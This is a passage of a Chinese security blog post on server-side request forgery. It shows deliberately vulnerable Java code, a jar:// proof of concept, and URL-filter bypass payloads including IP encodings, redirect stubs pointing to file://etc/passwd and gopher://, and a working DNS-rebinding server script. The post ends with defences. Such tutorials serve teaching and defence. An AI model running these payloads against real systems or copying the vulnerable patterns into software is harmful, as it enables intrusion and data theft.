+<h4 id="ImageIO类"><a href="#ImageIO类" class="headerlink" title="ImageIO类"></a>ImageIO类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ImageIO ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); <span class="comment">// 发起请求,触发漏洞</span></span><br></pre></td></tr></table></figure>
+<h4 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Request漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">return</span> Request.Get(url).execute().returnContent().toString();<span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// openStream漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">inputStream = u.openStream();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OkHttpClient漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = <span class="keyword">new</span> com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// HttpClients漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); <span class="comment">//发起请求</span></span><br></pre></td></tr></table></figure>
+<h3 id="特有jar-协议分析"><a href="#特有jar-协议分析" class="headerlink" title="特有jar://协议分析"></a>特有jar://协议分析</h3><p>jar://协议能从远程获取jar文件及解压得到其中的内容，其格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&lt;url&gt;!/&#123;entry&#125;</span><br></pre></td></tr></table></figure>
+<p>实例如下，<code>!</code>符号后面就是其需要从中解压出的文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://a.com/b.jar!/file/within/the/zip</span><br></pre></td></tr></table></figure>
+<p>jar://协议分类：</p>
+<ul>
+<li>Jar file（Jar包本身）：<code>jar:http://www.foo.com/bar/baz.jar!/</code></li>
+<li>Jar entry（Jar包中某个资源文件）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/a.class</code></li>
+<li>Jar directory（Jar包中某个目录）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/</code></li>
+</ul>
+<p>其实目前jar://协议在Java SSRF中的利用一般是获取目标jar包中的文件内容，比如某个类，其并不像其他常用的攻击协议一样能够对内网服务发起攻击。</p>
+<p>比如下面的poc是获取目标jar包内C3P0.class文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/MySSRF/ssrf2?url=jar:http://127.0.0.1/ysoserial.jar!/ysoserial/payloads/C3P0.class</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/29/SSRF-Tricks小结/5.png" alt=""></p>
+<p>这样就能看到jar包中的任何内容，如果jar包还是开发者自定义的话就会造成源码泄露，但是这个协议的利用还是很鸡肋。</p>
+<h3 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h3><p>参考Vulhub的环境：<a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p>
+<h2 id="0x03-SSRF-in-Python"><a href="#0x03-SSRF-in-Python" class="headerlink" title="0x03 SSRF in Python"></a>0x03 SSRF in Python</h2><p>SSRF在Python中也是一样的，漏洞点都是发起URL请求的函数的参数外部可控导致SSRf漏洞。最为经典的就是和urllib的CRLF注入漏洞的结合利用，可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p>
+<h2 id="0x04-URL地址过滤Bypass"><a href="#0x04-URL地址过滤Bypass" class="headerlink" title="0x04 URL地址过滤Bypass"></a>0x04 URL地址过滤Bypass</h2><p>如今，大多数站点都对存在SSRF风险的地方的URL参数进行了过滤，但开发者的水平参差不齐，会存在一些可被绕过的场景。</p>
+<h3 id="符绕过URL白名单"><a href="#符绕过URL白名单" class="headerlink" title="@符绕过URL白名单"></a>@符绕过URL白名单</h3><p>有时候后台程序会以白名单的方式校验输入的URL参数是否为白名单中的域名或IP，但如果只校验如是否以<code>http://a.com</code>开头，则可以通过<code>@</code>符进行绕过：<code>http://a.com@10.10.10.100</code></p>
+<p>而此时实际访问的是<code>http://10.10.10.100</code>。</p>
+<h3 id="IP地址进制转换绕过"><a href="#IP地址进制转换绕过" class="headerlink" title="IP地址进制转换绕过"></a>IP地址进制转换绕过</h3><p>通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如：</p>
+<ul>
+<li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</code></li>
+<li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li>
+<li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li>
+</ul>
+<p>此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成：</p>
+<ul>
+<li>8进制格式：0300.0250.0.1</li>
+<li>16进制格式：0xC0.0xA8.0.1</li>
+<li>16进制整数格式：0xC0A80001</li>
+<li>10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式）</li>
+</ul>
+<p>其他特殊形式：</p>
+<ul>
+<li>10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作；</li>
+<li>0.0.0.0可以直接访问到本地；</li>
+</ul>
+<h3 id="通过xip-io解析到内网绕过"><a href="#通过xip-io解析到内网绕过" class="headerlink" title="通过xip.io解析到内网绕过"></a>通过xip.io解析到内网绕过</h3><p>这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的：</p>
+<ul>
+<li>10.0.0.1.xip.io</li>
+<li><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></li>
+<li>mysite.10.0.0.1.xip.io</li>
+<li>foo.bar.10.0.0.1.xip.io</li>
+</ul>
+<h3 id="利用IPv6绕过"><a href="#利用IPv6绕过" class="headerlink" title="利用IPv6绕过"></a>利用IPv6绕过</h3><blockquote>
+<p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code>或IPv6的内网域名来绕过过滤。</p>
+</blockquote>
+<h3 id="利用IDN绕过"><a href="#利用IDN绕过" class="headerlink" title="利用IDN绕过"></a>利用IDN绕过</h3><blockquote>
+<p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
+<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p>
+</blockquote>
+<h3 id="利用30x跳转绕过"><a href="#利用30x跳转绕过" class="headerlink" title="利用30x跳转绕过"></a>利用30x跳转绕过</h3><blockquote>
+<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p>
+<p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1" target="_blank" rel="noopener">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p>
+<p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p>
+</blockquote>
+<p>跳转常见的结合协议的方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: file://etc/passwd"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: dict://127.0.0.1:666/info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: gopher://127.0.0.1:666/_info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNS Rebinding可以利用于绕过SSRF以及绕过同源策略等。</p>
+<p>这里看下利用DNS Rebinding绕过SSRF过滤URL参数的场景，有如下三种方法。</p>
+<h4 id="特定域名实现TTL-0"><a href="#特定域名实现TTL-0" class="headerlink" title="特定域名实现TTL=0"></a>特定域名实现TTL=0</h4><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
+<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
+<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
+<ul>
+<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
+<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
+<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
+<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
+</ul>
+<h4 id="域名绑定两条A记录"><a href="#域名绑定两条A记录" class="headerlink" title="域名绑定两条A记录"></a>域名绑定两条A记录</h4><p>四分之一的概率，当第一次解析为外网IP，第二次解析为内网IP，就会成功。</p>
+<p><img src="/2020/02/29/SSRF-Tricks小结/6.png" alt=""></p>
+<h4 id="自建DNS服务器"><a href="#自建DNS服务器" class="headerlink" title="自建DNS服务器"></a>自建DNS服务器</h4><p>先添加一条NS记录和一条A记录：</p>
+<p><img src="/2020/02/29/SSRF-Tricks小结/7.png" alt=""></p>
+<p>Ns记录表示这个子域名test.h0pe.site指定由ns.h0pe.site域名服务器解析，A记录表示ns.h0pe.site位置在ip地址x.x.x.x上。</p>
+<p>在这个IP地址上搭建DNS服务器，采用Python的twisted库的name模块，核心代码如下，以root权限运行即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"171.18.0.2"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
+<h3 id="通过各种非HTTP协议"><a href="#通过各种非HTTP协议" class="headerlink" title="通过各种非HTTP协议"></a>通过各种非HTTP协议</h3><p>在某些情况下，后台会限制协议类型，如不能使用http/https。</p>
+<p>在前面的SSRF攻击利用中提到过很多协议，如file、dict、gopher等，可以使用这些不在限制协议名单中的协议来绕过利用，具体的还得看后台语言和环境而定。</p>
+<h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="SSRF-文件解析漏洞"><a href="#SSRF-文件解析漏洞" class="headerlink" title="SSRF+文件解析漏洞"></a>SSRF+文件解析漏洞</h3><p>当某个页面存在SSRF漏洞，但限制了只能加载jpg等图片类型后缀的文件。此时可以结合如Apache解析漏洞，上传一个a.php.jpg的恶意文件，在通过SSRF漏洞来加载执行。</p>
+<h3 id="SSRF-CRLF注入漏洞"><a href="#SSRF-CRLF注入漏洞" class="headerlink" title="SSRF+CRLF注入漏洞"></a>SSRF+CRLF注入漏洞</h3><p>如SSRF in Python中所说。</p>
+<h3 id="SSRF-XXE漏洞"><a href="#SSRF-XXE漏洞" class="headerlink" title="SSRF+XXE漏洞"></a>SSRF+XXE漏洞</h3><p>参考bWAPP中SSRF。</p>
+<h3 id="其他一些漏洞利用组合"><a href="#其他一些漏洞利用组合" class="headerlink" title="其他一些漏洞利用组合"></a>其他一些漏洞利用组合</h3><ul>
+<li>Apache Hadoop远程命令执行</li>
+<li>axis2-admin部署Server命令执行</li>
+<li>Confluence SSRF</li>
+<li>counchdb WEB API远程命令执行</li>
+<li>dict</li>
+<li>docker API远程命令执行</li>
+<li>Elasticsearch引擎Groovy脚本命令执行</li>
+<li>ftp / ftps（FTP爆破）</li>
+<li>glassfish任意文件读取和war文件部署间接命令执行</li>
+<li>gopher</li>
+<li>HFS远程命令执行</li>
+<li>http、https</li>
+<li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li>
+<li>Java调试接口命令执行</li>
+<li>JBOSS远程Invoker war命令执行</li>
+<li>Jenkins Scripts接口命令执行</li>
+<li>ldap</li>
+<li>mongodb</li>
+<li>php_fpm/fastcgi 命令执行</li>
+<li>rtsp - smb/smbs（连接SMB）</li>
+<li>sftp</li>
+<li>ShellShock命令执行</li>
+<li>Struts2 RCE</li>
+<li>telnet</li>
+<li>tftp（UDP协议扩展）</li>
+<li>tomcat命令执行</li>
+<li>WebDav PUT上传任意文件</li>
+<li>WebSphere Admin可部署war间接命令执行</li>
+<li>zentoPMS远程命令执行</li>
+</ul>
+<h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul>
+<li>限制协议为http/https，禁用不必要的协议；</li>
+<li>尽量禁止30x跳转；</li>
+<li>设置URL白名单或限制内网IP、限制请求的端口等；</li>
+<li>统一错误信息；</li>
+<li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单；</li>
+</ul>
+<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">SSRF in PHP</a></p>
+<p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">Web安全学习笔记-SSRF</a></p>
+<p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">SSRF Tips</a></p>
+<p><a href="https://www.t00ls.net/articles-41070.html#" target="_blank" rel="noopener">SSRF漏洞(原理&amp;绕过姿势)</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-SSRF-in-PHP"><span class="toc-text">0x01 SSRF in PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF相关函数"><span class="toc-text">SSRF相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#可利用的协议"><span class="toc-text">可利用的协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地利用"><span class="toc-text">本地利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-协议任意读文件"><span class="toc-text">file://协议任意读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dict-协议探测端口及banner信息"><span class="toc-text">dict://协议探测端口及banner信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher-协议反弹shell"><span class="toc-text">gopher://协议反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程利用"><span class="toc-text">远程利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Redis反弹Shell"><span class="toc-text">Redis反弹Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#通过Gopher协议实现"><span class="toc-text">通过Gopher协议实现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#通过Dict协议实现"><span class="toc-text">通过Dict协议实现</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击本地PHP-FPM"><span class="toc-text">攻击本地PHP-FPM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-SSRF-in-Java"><span class="toc-text">0x02 SSRF in Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#可利用的协议-1"><span class="toc-text">可利用的协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF相关类"><span class="toc-text">SSRF相关类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞示例代码"><span class="toc-text">漏洞示例代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HttpURLConnection类"><span class="toc-text">HttpURLConnection类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLConnection类"><span class="toc-text">URLConnection类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ImageIO类"><span class="toc-text">ImageIO类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其他类"><span class="toc-text">其他类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特有jar-协议分析"><span class="toc-text">特有jar://协议分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic-SSRF漏洞"><span class="toc-text">Weblogic SSRF漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-SSRF-in-Python"><span class="toc-text">0x03 SSRF in Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-URL地址过滤Bypass"><span class="toc-text">0x04 URL地址过滤Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#符绕过URL白名单"><span class="toc-text">@符绕过URL白名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP地址进制转换绕过"><span class="toc-text">IP地址进制转换绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过xip-io解析到内网绕过"><span class="toc-text">通过xip.io解析到内网绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用IPv6绕过"><span class="toc-text">利用IPv6绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用IDN绕过"><span class="toc-text">利用IDN绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用30x跳转绕过"><span class="toc-text">利用30x跳转绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Rebinding"><span class="toc-text">DNS Rebinding</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#特定域名实现TTL-0"><span class="toc-text">特定域名实现TTL=0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#域名绑定两条A记录"><span class="toc-text">域名绑定两条A记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#自建DNS服务器"><span class="toc-text">自建DNS服务器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过各种非HTTP协议"><span class="toc-text">通过各种非HTTP协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-漏洞组合拳"><span class="toc-text">0x05 漏洞组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-文件解析漏洞"><span class="toc-text">SSRF+文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-CRLF注入漏洞"><span class="toc-text">SSRF+CRLF注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-XXE漏洞"><span class="toc-text">SSRF+XXE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他一些漏洞利用组合"><span class="toc-text">其他一些漏洞利用组合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-防御方法"><span class="toc-text">0x06 防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考"><span class="toc-text">0x07 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/02/27/内网信息收集之本机信息收集/" rel="next" title="内网信息收集之本机信息收集">
+          内网信息收集之本机信息收集
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/03/05/Redis安全小结/" rel="prev" title="Redis安全小结">
+            Redis安全小结
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
